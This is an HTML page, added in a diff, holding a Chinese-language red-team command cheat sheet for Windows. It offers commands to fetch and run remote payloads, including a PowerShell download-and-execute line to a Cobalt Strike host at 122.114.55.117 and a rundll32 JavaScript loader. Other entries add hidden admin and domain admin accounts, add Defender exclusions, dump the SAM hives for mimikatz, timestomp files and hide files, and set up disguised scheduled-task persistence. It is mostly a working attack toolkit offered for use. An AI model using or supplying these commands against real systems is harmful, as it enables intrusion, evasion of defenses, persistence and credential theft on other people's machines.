@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!--
+    The page_title contains the title for a page as shown in the navigation.
+    Site name contains the name as defined in the mkdocs.yml
+  -->
+  <title>Windows 命令速查 - 红队命令速查</title>
+
+  <!-- Page description -->
+  
+
+  <!-- Redirect -->
+  
+
+  <!-- Page author -->
+  
+  <!--
+    Just add a favicon.ico image to the docs.
+  -->
+  <link rel="shortcut icon" href="../img/favicon.ico">
+
+  <link rel="stylesheet" href="../css/colors.css">
+  <link rel="stylesheet" href="../css/bundle.css">
+  <link rel="stylesheet" href="../css/theme.css">
+  <link media="print" onload="this.media='all'" rel="stylesheet" href="../css/atom-dark-one.min.css">
+  <!--
+    extra_ess contains paths to CSS files in the users
+    documentation directory or a list of CSS files defined in
+    their mkdocs.yml.
+
+    http://www.mkdocs.org/user-guide/configuration/#extra_css
+  -->
+  
+
+  
+  
+
+  <!--
+    Include Google Analytics tracking code.
+
+    http://www.mkdocs.org/user-guide/configuration/#google_analytics
+  -->
+  
+
+</head>
+
+<body>
+<input id="dark-mode" type="checkbox" />
+<!--
+  The JS has to be loaded here for maximum performance, right after the #dark-mode
+-->
+<script src="../js/theme.js"></script>
+<div class="app-body">
+  <!-- KPN STYLE Beginning -->
+  <div class="app-layout ">
+    <!-- Top Bar -->
+    <nav class="app-layout__top-bar top-bar">
+      <a class="top-bar__logo" href="https://forum.ywhack.com/command/">
+        <img alt="KPN Logo" src="../img/logo.svg" />
+      </a>
+      <div class="top-bar__title">红队命令速查</div>
+      <ul class="top-bar__menu">
+        <!--
+          Create a search form that sends the user to the search.html file - this is
+          the other file in the template which adds search to the theme. The only
+          requirement here is that there is a text input with the name 'q' and the
+          action and methods match below.
+        -->
+          <li class="top-bar__item">
+
+            <span role="search" id="search-input-wrapper">
+              <form action="../search.html" method="get">
+                <input type="text" class="input" id="search-input" name="q" placeholder="Search..." />
+              </form>
+            </span >
+          </li>
+        <!--
+          Versioning support
+        -->
+        
+        <!--
+          Support repo URL
+        -->
+        <li class="top-bar__item">
+          
+        </li>
+
+        <li class="top-bar__item">
+            <label class="top-bar__link" id="label-dark-mode" for="dark-mode" title="Dark mode">
+              <svg alt="dark mode" width="24" height="24">
+                <image xlink:href="../img/ui-bulb.svg" width="24" height="24"/>
+            </svg>
+            </label>
+        </li>
+        <li class="top-bar__item top-bar__item--trigger"></li>
+
+        <!-- <li class="top-bar__item">
+
+          <a class="top-bar__link top-bar__link--active">Home</a>
+        </li>
+        <li class="top-bar__item"><a class="top-bar__link">Information</a></li>
+        <li class="top-bar__item">
+          <a class="top-bar__link top-bar__link--collapsed">Getting Started</a>
+
+        </li>
+        <li class="top-bar__item top-bar__item--trigger">Menu</li> -->
+      </ul>
+    </nav>
+
+    <!--
+      Create the navigation for the documentation.
+
+      Because we don't know how many levels deep the navigation is, it needs to
+      be included in it's own file so it can be recursive. Otherwise the theme
+      can also only support a specific number of levels.
+
+      See the nav.html file for more details about how this works.
+    -->
+    <nav class="app-layout__side-bar side-bar">
+      <div class="side-bar__action-bar">
+        <a class="side-bar__link" href="/">红队命令速查</a>
+        <!--
+          Versioning support
+        -->
+        
+        <button class="side-bar__close"></button>
+      </div>
+      <ul class="side-bar__menu">
+        
+          <!--
+
+-->
+
+<li>
+  <a href=".." class="side-bar__link ">
+    介绍
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="side-bar__link ">
+    Linux 命令速查
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+<li>
+  <a href="./" class="side-bar__link side-bar__link--active">
+    Windows 命令速查
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+  <li>
+    <span class="side-bar__link side-bar__link--expanded">
+      工具使用命令速查
+    </span>
+    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/" class="side-bar__link ">
+    mimikatz
+  </a>
+</li>
+
+
+        
+    </ul>
+  </li>
+
+
+        
+          <!--
+
+-->
+
+  <li>
+    <span class="side-bar__link side-bar__link--expanded">
+      数据库命令速查
+    </span>
+    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/" class="side-bar__link ">
+    oracle
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/" class="side-bar__link ">
+    mysql
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/" class="side-bar__link ">
+    postgresql
+  </a>
+</li>
+
+
+        
+    </ul>
+  </li>
+
+
+        
+      </ul>
+    </nav>
+
+    <!-- MAIN BLOCK -->
+    <main class="app-layout__main main">
+      <div class="app-layout__title-bar title-bar">
+        <div class="title-bar__title" style="font-size: 12px;">Windows 命令速查</div>
+      </div>
+      
+      <div class="sidebar--secondary hidden-s hidden-xs">
+        <h4>Table of contents</h4>
+        <ul>
+        
+          
+            
+                <li><a class="a" href="#tcp">TCP 出网探测</a></li>
+                
+            
+                <li><a class="a" href="#_1">远程下载文件</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#certutil">certutil</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#powershell">PowerShell</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#bitsadmin">BitsAdmin</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#rundll32">rundll32</a></li>
+                
+            
+                <li><a class="a" href="#iis">IIS 网站查询</a></li>
+                
+            
+                <li><a class="a" href="#_2">修改文件时间</a></li>
+                
+            
+                <li><a class="a" href="#_3">进程操作</a></li>
+                
+            
+                <li><a class="a" href="#powershell-exe">Powershell 无窗口执行 EXE</a></li>
+                
+            
+                <li><a class="a" href="#net">net 命令</a></li>
+                
+            
+                <li><a class="a" href="#netsh">netsh 操作防火墙</a></li>
+                
+            
+                <li><a class="a" href="#windows-defender">WIndows Defender 加白排除目录：</a></li>
+                
+            
+                <li><a class="a" href="#_4">文件写入</a></li>
+                
+            
+                <li><a class="a" href="#_5">注册表：</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#restricted-admin-mode">Restricted Admin Mode</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#3389">查看3389端口</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#_6">开启远程桌面</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#sam">导出 SAM 数据库</a></li>
+                
+            
+                <li><a class="a" href="#_7">查看盘符剩余空间</a></li>
+                
+            
+                <li><a class="a" href="#_8">搜索文件：</a></li>
+                
+            
+                <li><a class="a" href="#cs">CS 上线</a></li>
+                
+            
+                <li><a class="a" href="#_9">设置文件属性</a></li>
+                
+            
+                <li><a class="a" href="#_10">计划任务</a></li>
+                
+            
+                <li><a class="a" href="#rdp">RDP 凭据</a></li>
+                
+            
+                <li><a class="a" href="#windows_1">Windows 打包目录上传文件</a></li>
+                
+            
+                <li><a class="a" href="#_11">域渗透命令</a></li>
+                
+            
+          
+        
+        </ul>
+      </div>
+      
+      <div class="container content-block">
+        <div class="kpn-style">
+          <div class="card">
+            <div class="card__body">
+
+              
+              <h1 id="windows">Windows 命令速查</h1>
+<h2 id="tcp">TCP 出网探测</h2>
+<pre><code>powershell Test-NetConnection -ComputerName [目标主机名或IP] -Port [端口号]
+</code></pre>
+<h2 id="_1">远程下载文件</h2>
+<h3 id="certutil">certutil</h3>
+<pre><code>certutil.exe -urlcache -split -f &quot;http://127.0.0.1:8080/file.exe&quot; &quot;C:/Windows/temp/file.exe&quot;
+
+//从 http://127.0.0.1:8080/ 下载 file.exe 并保存到 C:/Windows/temp/file.exe
+</code></pre>
+<h3 id="powershell">PowerShell</h3>
+<pre><code>powershell -Command &quot;Invoke-WebRequest -Uri 'https://www.example.com/file.zip' -OutFile 'C:\Downloads\file.zip'&quot;
+</code></pre>
+<h3 id="bitsadmin">BitsAdmin</h3>
+<pre><code>bitsadmin /transfer &quot;JobName&quot; /download /priority normal https://www.example.com/file.zip C:\path\to\save\file.zip
+</code></pre>
+<h3 id="rundll32">rundll32</h3>
+<pre><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.3.150/chfs/shared/1Z3.exe&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}
+</code></pre>
+<h2 id="iis">IIS 网站查询</h2>
+<blockquote>
+<p>查看 IIS 绑定的网站：</p>
+</blockquote>
+<pre><code>%windir%\system32\inetsrv\appcmd.exe list sites
+</code></pre>
+<blockquote>
+<p>查看 Site ID 为 1 的物理路径：</p>
+</blockquote>
+<pre><code>%windir%\system32\inetsrv\appcmd list site /site.id:1 /config | findstr &quot;physicalPath&quot;
+</code></pre>
+<blockquote>
+<p>IIS 配置文件：</p>
+</blockquote>
+<pre><code>C:\Windows\System32\inetsrv\config\applicationHost.config
+%SystemRoot%\System32\inetsrv\config\applicationHost.config
+</code></pre>
+<h2 id="_2">修改文件时间</h2>
+<pre><code>powershell -command &quot;(Get-Item 'C:\path\to\your\file.txt').CreationTime = '2024-01-01 12:00 AM'; (Get-Item 'C:\path\to\your\file.txt').LastWriteTime = '2024-01-02 12:00 AM'&quot;
+</code></pre>
+<h2 id="_3">进程操作</h2>
+<blockquote>
+<p>查看端口对应 PID：</p>
+</blockquote>
+<pre><code>netstat -ano | findstr :80
+</code></pre>
+<blockquote>
+<p>查看 PID 对应程序：</p>
+</blockquote>
+<pre><code>tasklist /FI &quot;PID eq 1234&quot;
+</code></pre>
+<blockquote>
+<p>根据 PID 查看程序所在目录：</p>
+</blockquote>
+<pre><code>wmic process where ProcessId=1234 get ExecutablePath
+</code></pre>
+<blockquote>
+<p>执行进程：</p>
+</blockquote>
+<pre><code>start /b  xxx.exe
+</code></pre>
+<blockquote>
+<p>根据名称结束进程：</p>
+</blockquote>
+<pre><code>taskkill /f /t /im GotoHTTP.exe
+</code></pre>
+<blockquote>
+<p>搜索进程</p>
+</blockquote>
+<pre><code>tasklist | findstr &quot;powershell&quot;
+</code></pre>
+<h2 id="powershell-exe">Powershell 无窗口执行 EXE</h2>
+<pre><code>powershell -executionPolicy bypass Start-Process -WindowStyle hidden -FilePath 'C:/Windows/temp/rd.exe'
+</code></pre>
+<h2 id="net">net 命令</h2>
+<pre><code>查看用户列表: net user
+powershell查看用户列表: Get-WmiObject -Class Win32_UserAccount
+查看用户组列表: net localgroup
+查看管理组列表: net localgroup Administrators
+添加用户并设置密码: net user test P@ssw0rd /add
+将用户加入管理组: net localgroup Administrators test /add
+将用户加入桌面组: net localgroup &quot;Remote Desktop Users&quot; guest /add
+激活guest用户: net user guest /active:yes
+更改guest用户的密码: net user guest P@ssw0rd
+将用户加入管理组: net localgroup administrators guest /add
+将用户加入桌面组: net localgroup &quot;Remote Desktop Users&quot; guest /add
+查看本地密码策略: net accounts
+查看当前会话: net session
+建立IPC会话: net use \\127.0.0.1\c$ &quot;P@ssw0rd&quot; /user:&quot;domain\Administrator&quot;
+</code></pre>
+<h2 id="netsh">netsh 操作防火墙</h2>
+<ul>
+<li>查看防火墙配置：</li>
+</ul>
+<pre><code>netsh firewall show config
+</code></pre>
+<ul>
+<li>Windows Server 2003 及之前的版本，允许指定程序全部连接</li>
+</ul>
+<pre><code>netsh firewall add allowedprogram C:\nc.exe &quot;allow nc&quot; enable
+</code></pre>
+<ul>
+<li>Windows Server 2003之后的版本</li>
+</ul>
+<pre><code>netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir in action=allow program=&quot;C:\nc.exe
+</code></pre>
+<ul>
+<li>允许3389放行</li>
+</ul>
+<pre><code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow
+</code></pre>
+<h2 id="windows-defender">WIndows Defender 加白排除目录：</h2>
+<pre><code>C:\Windows\System32\wbem\wmic.exe /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath=C:\
+
+powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath &quot;C:\test&quot;
+</code></pre>
+<h2 id="_4">文件写入</h2>
+<pre><code>echo test &gt; C:\test.txt
+set /p=test&lt;nul&gt;C:\test.txt
+
+//规避空格
+echo.123&gt;&gt;a.txt
+echo,123&gt;&gt;a.txt
+type;a.txt
+
+//将base64编码的文件解码写入到 test.jsp
+certutil -f -decode base64.txt C:\\test.jsp
+
+//将十六进制文件解码写入到 test.jsp
+certutil -decodehex hex.txt C:\\test.jsp
+</code></pre>
+<h2 id="_5">注册表：</h2>
+<h3 id="restricted-admin-mode">Restricted Admin Mode</h3>
+<pre><code>对应命令行开启 Restricted Admin mode 命令如下：
+REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+
+查看是否已开启 DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启
+REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;
+</code></pre>
+<h3 id="3389">查看3389端口</h3>
+<pre><code>REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber
+</code></pre>
+<h3 id="_6">开启远程桌面</h3>
+<pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+或者
+
+wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+</code></pre>
+<h3 id="sam">导出 SAM 数据库</h3>
+<pre><code>reg save HKLM\SYSTEM sys.hiv
+reg save HKLM\SAM sam.hiv
+
+复制：
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\config\SAM
+
+使用 https://github.com/3gstudent/NinjaCopy 进行复制。
+
+lsadump::sam /sam:sam.hiv /system:system.hiv
+</code></pre>
+<h2 id="_7">查看盘符剩余空间</h2>
+<pre><code>## 大小为字节磁盘
+::查看C盘
+wmic LogicalDisk where &quot;Caption='C:'&quot; get FreeSpace,Size /value
+::查看D盘
+wmic LogicalDisk where &quot;Caption='D:'&quot; get FreeSpace,Size /value
+</code></pre>
+<h2 id="_8">搜索文件：</h2>
+<pre><code>#搜索 D 盘下名为 shell.jsp 的文件
+cd /d D:\ &amp;&amp; dir /b /s shell.jsp
+
+#搜素 D 盘下后缀为 conf 内容且包含 password（不区分大小写）:
+findstr /s /i /n /d:D:\ &quot;password&quot; *.conf
+</code></pre>
+<h2 id="cs">CS 上线</h2>
+<pre><code>powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://122.114.55.117:8012/download/upload.ps1')
+</code></pre>
+<pre><code>msiexec /q /i http://127.0.0.1:8080/ms10-051.msi
+</code></pre>
+<h2 id="_9">设置文件属性</h2>
+<pre><code class="language-bash">attrib +s +a +h +r cs.exe // 给文件设置系统文件属性、存档文件属性、隐藏文件属性、只读文件属性
+</code></pre>
+<h2 id="_10">计划任务</h2>
+<pre><code class="language-bash">schtasks /create /ru system /tn &quot;Microsoft\Windows\Multimedia\SystemMediaService&quot; /sc ONSTART /tr &quot;C:\cs.exe&quot; 
+// 创建一个名为Microsoft\Windows\Multimedia\SystemMediaService，开机时执行 c:\cs.exe 的计 划任务，需要管理员权限
+
+schtasks /change /tn &quot;Microsoft\Windows\Multimedia\SystemSoundsService&quot; /ru system /tr &quot;C:\cs.exe&quot; /enable 
+// 修改Microsoft\Windows\Multimedia\SystemSoundsService 计划任务，需要管理员权限， 更改任务无法通过 /sc、/mo 参数更改计划频率
+</code></pre>
+<h2 id="rdp">RDP 凭据</h2>
+<pre><code>#列出所有 RDP 凭证
+C:\Users\用户名\AppData\Local\Microsoft\Credentials
+
+dir /a C:\Users\Administrator\AppData\Local\Microsoft\Credentials
+</code></pre>
+<h2 id="windows_1">Windows 打包目录上传文件</h2>
+<pre><code>powershell -Command &quot;Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip&quot;
+
+7z.exe a -r -p12345 C:\webs\1.7z C:\webs\
+
+zip -r C:\webs\1.zip C:\webs\
+</code></pre>
+<h2 id="_11">域渗透命令</h2>
+<pre><code>whoami /user  //查看当前用户权限
+net config workstation  //可知域名和其他信息
+net user /domain  //查询域用户
+net user edgeuser Admin12345 /add /domain  //添加域用户
+net group &quot;domain admins&quot; edgeuser /add /domain  //添加域管理员
+net group &quot;enterprise admins&quot; edgeuser /add /domain  //添加企业管理员
+net group &quot;domain admins&quot; /domain  //查询域管理员用户
+net group &quot;enterprise admins&quot; /domain  //查询域企业管理组
+net localgroup administrators /domain  //查询域本地管理组
+net time /domain  //查询域控制器和时间
+net view /domain  //查询域名称
+net view /domain:redteam.local  //查询域内计算机
+net group &quot;domain computers&quot; /domain  //查看当前域内计算机列表
+net group &quot;domain controllers&quot; /domain  //查看域控机器名
+net accounts /domain  //查看域密码策略
+nltest /domain_trusts  //查看域信任
+nltest /domain_trusts /all_trusts /v /server:10.10.10.10  //查看某个域的域信任
+nslookup -type=SRV _ldap._tcp.corp  //通过srv记录查找域控制器
+</code></pre>
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+      <div class="footer__body">
+        
+        <div class="row">
+          <div class="col col--s-4 col--m-3 col--l-2">
+          </div>
+          <div class="col col--s-4 col--m space-between">
+            
+              <a class="footer__link padding-top-0 navigation-prev"
+                href="../Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/"
+                title="Linux 命令速查">
+                &#8592; Previous Page
+              </a>
+            
+            
+            
+              <a class="footer__link padding-top-0 navigation-next"
+                href="../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/"
+                title="mimikatz"/>
+                Next Page &#8594;
+              </a>
+            
+          </div>
+          <div class="col col--s-4 col--m-3 ">
+          </div>
+        </div>
+        
+      </div>
+    </footer>
+  </div>
+
+
+  <!--
+  MkDocs version      : 1.5.3
+  Docs Build Date UTC : 2024-07-09 15:06:35.700736+00:00
+  -->
+
+  <!--
+    To include static assets from our theme, just add
+    .. beforehand which will be the relative path to
+    the root of the documentation.
+  -->
+  <script src="../js/highlight.min.js"></script>
+  <script src="../js/languages/groovy.min.js"></script>
+  <script src="../js/languages/asciidoc.min.js"></script>
+  <script src="../js/languages/nix.min.js"></script>
+
+  <script>
+    hljs.highlightAll();
+  </script>
+  <script async src="../js/detail.js"></script>
+  <!--
+    extra_javascript contains paths to JavaScript files in the
+    users documentation directory or a list of JavaScript files
+    defined in their mkdocs.yml.
+
+    http://www.mkdocs.org/user-guide/configuration/#extra_javascript
+  -->
+  
+    <script src="../search/main.js"></script>
+  
+
+
+  <script>
+  function getMermaidTheme() {
+    if (document.getElementById("dark-mode").checked) {
+      return 'dark'
+    }
+    return 'forest'
+  }
+
+  function initMermaid() {
+    mermaid.initialize({
+      theme: getMermaidTheme(),
+      logLevel: 1,
+    });
+  }
+  var mermaidClass = document.getElementsByClassName('mermaid');
+  if (mermaidClass.length > 0) {
+
+    var mermaidScript = document.createElement('script');
+    mermaidScript.setAttribute("src", "../js/mermaid.min.js");
+    mermaidScript.setAttribute("async", "false");
+    mermaidScript.setAttribute("type", "text/javascript");
+    mermaidScript.onload = initMermaid;
+    document.body.appendChild(mermaidScript)
+
+  }
+  </script>
+
+</div>
+</body>
+</html>
